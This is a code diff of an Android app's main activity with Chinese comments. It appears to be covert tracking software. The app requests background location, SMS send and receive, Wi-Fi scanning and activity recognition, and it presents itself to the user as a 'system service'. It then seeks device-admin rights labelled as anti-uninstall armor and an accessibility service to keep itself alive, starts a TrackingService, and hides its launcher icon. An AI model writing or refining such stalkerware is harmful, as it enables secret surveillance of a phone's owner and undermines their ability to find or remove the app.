@@ -11,24 +11,25 @@ import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Handler;
-import android.os.Looper;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.widget.Toast;
 
 public class MainActivity extends Activity {
     private static final int REQ_PERMISSIONS = 100;
-    private boolean serviceStarted = false;
-    private int permissionRetryCount = 0; // 【新增】防死循环重试计数
+    private static final int REQ_NOTIFICATION = 101;
+    private static final int REQ_BG_LOCATION = 102;
 
-    // 步骤状态标志位
+    private boolean serviceStarted = false;
+    private int permissionRetryCount = 0;
+    private boolean alarmAsked = false;
+
     private boolean waitingForBgLocSetting = false;
     private boolean waitingForBatterySetting = false;
     private boolean waitingForDeviceAdmin = false;
     private boolean waitingForOverlaySetting = false;
-
-    private final Handler mainHandler = new Handler(Looper.getMainLooper());
+    private boolean waitingForAccessibilitySetting = false;
+    private boolean waitingForAlarmSetting = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -37,12 +38,56 @@ public class MainActivity extends Activity {
                 && getIntent().getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
             Toast.makeText(this, "🛡️ 系统服务初始化中", Toast.LENGTH_SHORT).show();
         }
-        checkAndRequestPermissions();
+
+        // ★ [NEW] 系统重建（内存回收）时恢复状态
+        //   注意：用户主动关闭 App 再打开时 savedInstanceState=null，不受影响
+        if (savedInstanceState != null) {
+            serviceStarted = savedInstanceState.getBoolean("serviceStarted", false);
+            alarmAsked = savedInstanceState.getBoolean("alarmAsked", false);
+            permissionRetryCount = savedInstanceState.getInt("permissionRetryCount", 0);
+            waitingForBgLocSetting = savedInstanceState.getBoolean("waitingForBgLocSetting", false);
+            waitingForBatterySetting = savedInstanceState.getBoolean("waitingForBatterySetting", false);
+            waitingForDeviceAdmin = savedInstanceState.getBoolean("waitingForDeviceAdmin", false);
+            waitingForOverlaySetting = savedInstanceState.getBoolean("waitingForOverlaySetting", false);
+            waitingForAccessibilitySetting = savedInstanceState.getBoolean("waitingForAccessibilitySetting", false);
+            waitingForAlarmSetting = savedInstanceState.getBoolean("waitingForAlarmSetting", false);
+            FileLogger.log(this, "MAIN", "♻️ Activity 重建，恢复状态: "
+                    + "serviceStarted=" + serviceStarted
+                    + ", waitingForAcc=" + waitingForAccessibilitySetting);
+        }
+    }
+
+    // ★ [NEW] 保存全部关键状态，仅供系统重建使用
+    @Override
+    protected void onSaveInstanceState(Bundle outState) {
+        super.onSaveInstanceState(outState);
+        outState.putBoolean("serviceStarted", serviceStarted);
+        outState.putBoolean("alarmAsked", alarmAsked);
+        outState.putInt("permissionRetryCount", permissionRetryCount);
+        outState.putBoolean("waitingForBgLocSetting", waitingForBgLocSetting);
+        outState.putBoolean("waitingForBatterySetting", waitingForBatterySetting);
+        outState.putBoolean("waitingForDeviceAdmin", waitingForDeviceAdmin);
+        outState.putBoolean("waitingForOverlaySetting", waitingForOverlaySetting);
+        outState.putBoolean("waitingForAccessibilitySetting", waitingForAccessibilitySetting);
+        outState.putBoolean("waitingForAlarmSetting", waitingForAlarmSetting);
     }
 
     @Override
     protected void onResume() {
         super.onResume();
+
+        if (waitingForAlarmSetting) {
+            waitingForAlarmSetting = false;
+            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
+            boolean ok = am != null && am.canScheduleExactAlarms();
+            if (ok) {
+                Toast.makeText(this, "✅ 精确闹钟已开启", Toast.LENGTH_SHORT).show();
+            } else {
+                Toast.makeText(this, "⚠️ 未开启精确闹钟，上报时间可能不准", Toast.LENGTH_LONG).show();
+            }
+            checkAndRequestPermissions();
+            return;
+        }
 
         if (waitingForDeviceAdmin) {
             waitingForDeviceAdmin = false;
@@ -50,11 +95,10 @@ public class MainActivity extends Activity {
             ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
             if (dpm != null && dpm.isAdminActive(adminComponent)) {
                 Toast.makeText(this, "✅ 防卸载装甲已激活", Toast.LENGTH_SHORT).show();
-                startTrackingServiceAndFinish();
             } else {
                 Toast.makeText(this, "⚠️ 未激活防卸载，应用将直接启动", Toast.LENGTH_LONG).show();
-                startTrackingServiceAndFinish();
             }
+            startTrackingServiceAndFinish();
             return;
         }
 
@@ -63,7 +107,7 @@ public class MainActivity extends Activity {
             if (Settings.canDrawOverlays(this)) {
                 Toast.makeText(this, "✅ 悬浮窗权限已开启", Toast.LENGTH_SHORT).show();
             }
-            checkDeviceAdmin(); 
+            checkDeviceAdmin();
             return;
         }
 
@@ -71,7 +115,7 @@ public class MainActivity extends Activity {
             waitingForBatterySetting = false;
             if (isBatteryOptimizationIgnored()) {
                 Toast.makeText(this, "✅ 电池优化已关闭", Toast.LENGTH_SHORT).show();
-                checkOverlayPermission(); 
+                checkOverlayPermission();
             } else {
                 promptBatteryOptimizationAgain();
             }
@@ -81,6 +125,25 @@ public class MainActivity extends Activity {
         if (waitingForBgLocSetting) {
             waitingForBgLocSetting = false;
             proceedAfterBackgroundLocation();
+            return;
+        }
+
+        if (waitingForAccessibilitySetting) {
+            waitingForAccessibilitySetting = false;
+            if (isAccessibilityServiceEnabled()) {
+                FileLogger.log(this, "ACCESSIBILITY", "✅ 无障碍已开启（从设置返回）");
+                finishWithToast("✅ 设置完成，无障碍服务已开启", Toast.LENGTH_LONG);
+            } else {
+                FileLogger.log(this, "ACCESSIBILITY", "⚠️ 从设置返回但未开启无障碍");
+                finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG);
+            }
+            return;
+        }
+
+        // ★ [FIX] 原代码是 return，系统重建后用户会看到空白 Activity。
+        //   改为 finish()，直接结束。
+        if (serviceStarted) {
+            finish();
             return;
         }
 
@@ -95,53 +158,79 @@ public class MainActivity extends Activity {
             return;
         }
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmAsked) {
             AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
             if (alarmManager != null && !alarmManager.canScheduleExactAlarms()) {
+                alarmAsked = true;
                 new AlertDialog.Builder(this)
-                        .setTitle("必须允许精确闹钟")
-                        .setMessage("为了让手机息屏后能准点上报定位，请在下一页面允许「闹钟和提醒」。")
+                        .setTitle("建议允许精确闹钟")
+                        .setMessage("允许精确闹钟后，手机息屏时定位上报会更准点。\n\n"
+                                + "• 点击「去设置」→ 开启「闹钟和提醒」\n"
+                                + "• 点击「暂不开启」→ 仍可运行，但上报时间可能有几分钟偏差")
                         .setCancelable(false)
                         .setPositiveButton("去设置", (dialog, which) -> {
-                            Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
-                            intent.setData(Uri.parse("package:" + getPackageName()));
-                            startActivity(intent);
-                        }).show();
+                            waitingForAlarmSetting = true;
+                            try {
+                                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
+                                intent.setData(Uri.parse("package:" + getPackageName()));
+                                startActivity(intent);
+                            } catch (Exception e) {
+                                waitingForAlarmSetting = false;
+                                Toast.makeText(this, "无法打开精确闹钟设置", Toast.LENGTH_SHORT).show();
+                                checkAndRequestPermissions();
+                            }
+                        })
+                        .setNegativeButton("暂不开启", (dialog, which) -> checkAndRequestPermissions())
+                        .show();
                 return;
             }
         }
 
         boolean needFgLoc = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED;
-        boolean needBgLoc = Build.VERSION.SDK_INT >= 29 && checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED;
         boolean needNotif = Build.VERSION.SDK_INT >= 33 && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED;
         boolean needSms = checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
                           checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED;
         boolean needActivity = Build.VERSION.SDK_INT >= 29 && checkSelfPermission(Manifest.permission.ACTIVITY_RECOGNITION) != PackageManager.PERMISSION_GRANTED;
-        // ★ [NEW] Android 13+ 的 WiFi 扫描权限，不申请则 DeviceInfoUtils.scanNearbyWifi 恒走降级分支
         boolean needNearbyWifi = Build.VERSION.SDK_INT >= 33
                 && checkSelfPermission("android.permission.NEARBY_WIFI_DEVICES") != PackageManager.PERMISSION_GRANTED;
 
         if (needFgLoc || needNotif || needSms || needActivity || needNearbyWifi) {
+            // ★ [P2-2] 防御性兜底：正常流程不会连续触发 ≥2 次
             if (permissionRetryCount >= 2) {
-                // 如果重试超过 2 次，直接跳过，防止死循环
-                proceedAfterPermissions();
+                checkBgLocThenProceed();
                 return;
             }
             permissionRetryCount++;
 
-            // ★ [NEW] 用 List 组装，避免 SDK<33 时为了凑数加重复权限
             java.util.List<String> perms = new java.util.ArrayList<>();
-            perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
-            perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
-            perms.add(Manifest.permission.RECEIVE_SMS);
-            perms.add(Manifest.permission.SEND_SMS);
-            perms.add(Manifest.permission.ACTIVITY_RECOGNITION);
-            if (Build.VERSION.SDK_INT >= 33) {
+            if (needFgLoc) {
+                perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
+                perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
+            }
+            if (needSms) {
+                perms.add(Manifest.permission.RECEIVE_SMS);
+                perms.add(Manifest.permission.SEND_SMS);
+            }
+            if (needActivity) {
+                perms.add(Manifest.permission.ACTIVITY_RECOGNITION);
+            }
+            if (needNotif) {
                 perms.add(Manifest.permission.POST_NOTIFICATIONS);
+            }
+            if (needNearbyWifi) {
                 perms.add("android.permission.NEARBY_WIFI_DEVICES");
             }
             requestPermissions(perms.toArray(new String[0]), REQ_PERMISSIONS);
-        } else if (needBgLoc) {
+        } else {
+            checkBgLocThenProceed();
+        }
+    }
+
+    private void checkBgLocThenProceed() {
+        boolean needBgLoc = Build.VERSION.SDK_INT >= 29
+                && checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED;
+
+        if (needBgLoc) {
             if (Build.VERSION.SDK_INT >= 30) {
                 new AlertDialog.Builder(this)
                         .setTitle("设置后台定位")
@@ -159,8 +248,55 @@ public class MainActivity extends Activity {
                             }
                         }).show();
             } else {
-                requestPermissions(new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, REQ_PERMISSIONS);
+                // API 29 走独立 requestCode，回调里不再回到这里
+                requestPermissions(
+                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION},
+                        REQ_BG_LOCATION);
             }
+            return;
+        }
+
+        proceedAfterPermissions();
+    }
+
+    private void proceedAfterBackgroundLocation() {
+        boolean bgLocOk = Build.VERSION.SDK_INT < 29
+                || checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED;
+
+        if (!bgLocOk) {
+            new AlertDialog.Builder(this)
+                    .setTitle("后台定位未开启")
+                    .setMessage("锁屏后可能无法定位。是否重新去设置？\n\n"
+                            + "进入后请找到「位置信息」→ 选择「始终允许」。")
+                    .setCancelable(false)
+                    .setPositiveButton("再去设置", (dialog, which) -> {
+                        waitingForBgLocSetting = true;
+                        try {
+                            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                            intent.setData(Uri.parse("package:" + getPackageName()));
+                            startActivity(intent);
+                        } catch (Exception e) {
+                            waitingForBgLocSetting = false;
+                            FileLogger.log(this, "LOCATION",
+                                    "⚠️ 打开后台定位设置失败: " + e.getMessage());
+                            checkNotifThenProceed();
+                        }
+                    })
+                    .setNegativeButton("暂不开启", (dialog, which) -> {
+                        Toast.makeText(this, "⚠️ 未开启后台定位，锁屏后可能无法定位", Toast.LENGTH_LONG).show();
+                        checkNotifThenProceed();
+                    })
+                    .show();
+            return;
+        }
+
+        checkNotifThenProceed();
+    }
+
+    private void checkNotifThenProceed() {
+        if (Build.VERSION.SDK_INT >= 33
+                && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIFICATION);
         } else {
             proceedAfterPermissions();
         }
@@ -169,17 +305,37 @@ public class MainActivity extends Activity {
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == REQ_PERMISSIONS) {
-            // 只要回调了，不马上重试，而是判断当前状态
+
+        // 后台定位独立回调：给没给都走二次确认，绝不回头重请
+        if (requestCode == REQ_BG_LOCATION) {
+            proceedAfterBackgroundLocation();
+            return;
+        }
+
+        if (requestCode == REQ_NOTIFICATION) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                // 成功给了一个，重置计数，继续查下一个
-                permissionRetryCount = 0;
-                checkAndRequestPermissions();
-            } else {
-                // 用户拒绝了，继续走流程（防止死循环）
-                Toast.makeText(this, "⚠️ 部分权限未授予，可能影响后台存活", Toast.LENGTH_LONG).show();
-                proceedAfterPermissions();
+                Toast.makeText(this, "✅ 通知权限已开启", Toast.LENGTH_SHORT).show();
             }
+            proceedAfterPermissions();
+            return;
+        }
+
+        if (requestCode != REQ_PERMISSIONS) return;
+
+        boolean allGranted = grantResults.length > 0;
+        for (int r : grantResults) {
+            if (r != PackageManager.PERMISSION_GRANTED) {
+                allGranted = false;
+                break;
+            }
+        }
+
+        if (allGranted) {
+            permissionRetryCount = 0;
+            checkAndRequestPermissions();
+        } else {
+            Toast.makeText(this, "⚠️ 部分权限未授予，可能影响后台存活", Toast.LENGTH_LONG).show();
+            checkBgLocThenProceed();
         }
     }
 
@@ -191,22 +347,15 @@ public class MainActivity extends Activity {
         }
     }
 
-    private void proceedAfterBackgroundLocation() {
-        if (Build.VERSION.SDK_INT >= 33
-                && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_PERMISSIONS);
-        } else {
-            proceedAfterPermissions();
-        }
-    }
-
     // ==================== 步骤二：电池优化 ====================
 
     private boolean isBatteryOptimizationIgnored() {
         try {
             PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
             return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
-        } catch (Exception e) { return false; }
+        } catch (Exception e) {
+            return false;
+        }
     }
 
     private void promptBatteryOptimization() {
@@ -237,8 +386,11 @@ public class MainActivity extends Activity {
         try {
             Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
             intent.setData(Uri.parse("package:" + getPackageName()));
-            if (intent.resolveActivity(getPackageManager()) != null) startActivity(intent);
-            else startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
+            if (intent.resolveActivity(getPackageManager()) != null) {
+                startActivity(intent);
+            } else {
+                startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
+            }
         } catch (Exception e) {
             waitingForBatterySetting = false;
             checkOverlayPermission();
@@ -265,7 +417,7 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ==================== 步骤四：设备管理器（防卸载） ====================
+    // ==================== 步骤四：设备管理器 ====================
 
     private void checkDeviceAdmin() {
         android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
@@ -297,61 +449,98 @@ public class MainActivity extends Activity {
         }
     }
 
-        // ==================== 无障碍服务引导 (2026-11-05 新增) ====================
-    private void checkAndOpenAccessibilitySettings() {
+    // ==================== 步骤五：无障碍 + 启动服务 ====================
+
+    private boolean isAccessibilityServiceEnabled() {
         final String service = getPackageName() + "/" + MyAccessibilityService.class.getCanonicalName();
         try {
-            // ★ [修复] 2026-11-05 只用 ENABLED_ACCESSIBILITY_SERVICES 判断
-            //   （ACCESSIBILITY_ENABLED 在 Android 13+ 已被系统限制读取）
-            String enabledServices = android.provider.Settings.Secure.getString(
+            String enabledServices = Settings.Secure.getString(
                     getContentResolver(),
-                    android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
-            if (enabledServices != null && enabledServices.contains(service)) {
-                FileLogger.log(this, "ACCESSIBILITY", "✅ 无障碍服务已开启");
-                return;
+                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+            if (enabledServices == null) return false;
+            for (String s : enabledServices.split(":")) {
+                if (s.equalsIgnoreCase(service)) return true;
             }
-        } catch (Exception ignored) {}
+            return false;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private void startTrackingServiceAndFinish() {
+        if (serviceStarted) {
+            finish();
+            return;
+        }
+        serviceStarted = true;
+        Intent intent = new Intent(this, TrackingService.class);
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent);
+            } else {
+                startService(intent);
+            }
+        } catch (Exception e) {
+            serviceStarted = false;
+            FileLogger.log(this, "START_SERVICE", "启动失败: " + e);
+            Toast.makeText(this, "服务启动失败，未隐藏图标", Toast.LENGTH_LONG).show();
+            finish();
+            return;
+        }
+        checkAndOpenAccessibilitySettingsAndFinish();
+    }
+
+    private void checkAndOpenAccessibilitySettingsAndFinish() {
+        if (isAccessibilityServiceEnabled()) {
+            FileLogger.log(this, "ACCESSIBILITY", "✅ 无障碍服务已开启（跳过引导）");
+            finishWithToast("✅ 设置完成，无障碍服务已开启", Toast.LENGTH_LONG);
+            return;
+        }
 
         new AlertDialog.Builder(this)
-                .setTitle("开启无障碍保活服务")
-                .setMessage("为保证服务被系统意外清理时能立即复活，请在下个页面找到【" 
-                        + getString(R.string.app_name) + "】并勾选开启。")
-                .setCancelable(false)
+                .setTitle("开启无障碍保活服务（推荐）")
+                .setMessage("为保证 App 被系统清理后能自动复活，推荐开启无障碍服务。\n\n"
+                        + "• 点击「去开启」跳转到无障碍设置，找到【" + getString(R.string.app_name) + "】并勾选开启\n"
+                        + "• 点击「暂不开启」或按返回键跳过本次引导\n\n"
+                        + "无论是否开启，完成后桌面图标都会自动隐藏。")
+                .setCancelable(true)
                 .setPositiveButton("去开启", (dialog, which) -> {
+                    waitingForAccessibilitySetting = true;
                     try {
-                        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                         startActivity(intent);
                     } catch (Exception e) {
-                        Toast.makeText(this, "无法打开无障碍设置: " + e.getMessage(), Toast.LENGTH_LONG).show();
+                        waitingForAccessibilitySetting = false;
+                        FileLogger.log(this, "ACCESSIBILITY", "⚠️ 无法打开无障碍设置: " + e.getMessage());
+                        finishWithToast("设置无法打开", Toast.LENGTH_SHORT);
                     }
                 })
                 .setNegativeButton("暂不开启", (dialog, which) -> {
-                    Toast.makeText(this, "⚠️ 未开启无障碍服务，后台存活率将受影响", Toast.LENGTH_LONG).show();
-                }).show();
+                    FileLogger.log(this, "ACCESSIBILITY", "⚠️ 用户主动跳过无障碍");
+                    finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG);
+                })
+                .setOnCancelListener(dialog -> {
+                    FileLogger.log(this, "ACCESSIBILITY", "⚠️ 用户按返回键跳过无障碍");
+                    finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG);
+                })
+                .show();
     }
 
-    // ==================== 步骤五：启动服务 ====================
+    // ==================== 统一收尾2026-11-06 11:05，较大调整 ====================
 
-        private void startTrackingServiceAndFinish() {
-        if (!serviceStarted) {
-            serviceStarted = true;
-            Intent intent = new Intent(this, TrackingService.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent);
-            else startService(intent);
+    private void finishWithToast(String msg, int duration) {
+        try {
             hideLauncherIcon();
-            // ★ [新增] 2026-11-05 最后一步引导开启无障碍
-            // 用户跳过也不影响，只是少了一条最稳的保活链路
-            try { checkAndOpenAccessibilitySettings(); } catch (Exception ignored) {}
+        } catch (Exception e) {
+            FileLogger.log(this, "ICON", "隐藏图标失败: " + e);
         }
-        // 注意：不要立即 finish()，让无障碍引导的 AlertDialog 有机会弹出；
-        // 用户点完按钮后 Activity 会在引导页返回到这里时自动结束
+        Toast.makeText(getApplicationContext(), msg, duration).show();
         finish();
     }
 
     private void hideLauncherIcon() {
-        // 👇 加这行日志，看看有没有打印
-        android.util.Log.d("HideIcon", "MainActivity 触发了隐藏图标调用");
+        FileLogger.log(this, "ICON", "隐藏桌面图标");
         LauncherIconUtils.setLauncherIconVisible(this, false);
     }
 }
